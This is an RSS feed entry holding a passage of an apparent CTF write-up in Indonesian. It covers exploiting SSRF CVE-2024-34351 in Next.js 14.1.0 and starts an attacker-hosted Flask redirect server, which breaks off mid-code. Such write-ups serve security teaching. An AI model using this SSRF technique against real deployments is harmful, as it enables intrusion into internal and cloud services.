<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cloud on lordrukie</title><link>https://blog.lordrukie.com/categories/cloud/</link><description>Recent content in Cloud on lordrukie</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 15 Aug 2025 22:54:19 +0700</lastBuildDate><atom:link href="https://blog.lordrukie.com/categories/cloud/index.xml" rel="self" type="application/rss+xml"/><item><title>ITSEC CTF 2025</title><link>https://blog.lordrukie.com/p/itsec-ctf-2025/</link><pubDate>Fri, 15 Aug 2025 22:54:19 +0700</pubDate><guid>https://blog.lordrukie.com/p/itsec-ctf-2025/</guid><description>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/banner.png" alt="Featured image of post ITSEC CTF 2025" />&lt;h2 id="cloud---rabbit-hole">Cloud - Rabbit Hole
&lt;/h2>&lt;blockquote>
&lt;p>My friend is obsessed with JoJo&amp;rsquo;s Bizarre Adventure, so he built a themed website and asked me to deploy it. Problem is&amp;hellip; I kinda used my dad&amp;rsquo;s AWS account without telling him 😅.
Can you take a look around the website and see if there&amp;rsquo;s anything sensitive exposed?&lt;br>
Flag Format: ITSEC{.*}&lt;br>
Author: kangwijen &amp;amp; Djumanto&lt;/p>
&lt;/blockquote>
&lt;h3 id="desciption">Desciption
&lt;/h3>&lt;p>Challenge cloud ini memiliki tiga kategori, yakni cloud, web, dan ai. Pada soal ini, peserta akan melakukan chaining attack terhadap ketiga topik tersebut.&lt;/p>
&lt;h3 id="enumeration--exploitation---web">Enumeration &amp;amp; Exploitation - Web
&lt;/h3>&lt;p>Diberikan website berikut
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image.png"
width="1496"
height="697"
loading="lazy"
class="gallery-image"
data-flex-grow="214"
data-flex-basis="515px"
>&lt;/p>
&lt;p>Jika dilihat menggunakan wappalyzer, diketahui bahwa web menggunakan nextjs versi 14.1.0
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-1.png"
width="864"
height="948"
loading="lazy"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="218px"
>&lt;/p>
&lt;p>Versi ini vulnerable terhadap SSRF CVE-2024-34351&lt;/p>
&lt;blockquote>
&lt;p>Ref: &lt;a class="link" href="https://github.com/God4n/nextjs-CVE-2024-34351-_exploit" target="_blank" rel="noopener"
>https://github.com/God4n/nextjs-CVE-2024-34351-_exploit&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Untuk cara exploitnya, pertama perlu setup vps dan jalankan code berikut&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">redirect&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">defaults&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;path&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;lt;path:path&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">method&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;HEAD&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;text/x-component&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">resp&lt;/span>
